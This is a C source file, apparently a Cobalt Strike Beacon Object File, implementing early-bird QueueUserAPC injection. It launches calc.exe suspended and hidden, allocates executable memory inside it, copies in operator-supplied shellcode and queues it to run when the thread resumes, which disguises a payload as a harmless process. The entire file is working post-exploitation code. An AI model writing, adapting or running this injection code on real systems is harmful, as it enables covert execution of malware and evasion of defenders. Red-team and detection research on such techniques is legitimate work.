// Chris Sikes
// Apr 2021
// Beacon Object file of QueueUserAPC injection
#include <windows.h>
#include "beacon.h"

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI WINBOOL WINAPI KERNEL32$SetThreadContext (HANDLE hThread, CONST CONTEXT *lpContext);
WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);
WINBASEAPI WINBOOL WINAPI KERNEL32$GetThreadContext (HANDLE hThread, LPCONTEXT lpContext);
WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

void go(char * argc, int len)
{
	char* shellcode;
	SIZE_T shell_len;
	datap	parser;
	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	shell_len = BeaconDataLength(&parser);
	shellcode = BeaconDataExtract(&parser, NULL);
   	STARTUPINFO si  = {sizeof(si)};
   	PROCESS_INFORMATION pi = {0};
   	LPVOID allocation_start;
  	LPCSTR cmd;
   	HANDLE hProcess, hThread;
   	NTSTATUS status;
  	si.cb = sizeof(si);
  	cmd = TEXT("C:\\Windows\\System32\\calc.exe");
 
   	if (!KERNEL32$CreateProcessA(cmd, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed: %d", KERNEL32$GetLastError());
    	}
    	KERNEL32$WaitForSingleObject(pi.hProcess, 2000); // Wait 2 seconds for process initialization 
    	hProcess = pi.hProcess;
    	hThread = pi.hThread;
    	allocation_start = KERNEL32$VirtualAllocEx(hProcess, NULL, shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    	KERNEL32$WriteProcessMemory(hProcess, allocation_start, shellcode, shell_len, NULL);
    	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocation_start;
    	KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);

    	KERNEL32$ResumeThread(hThread);
}
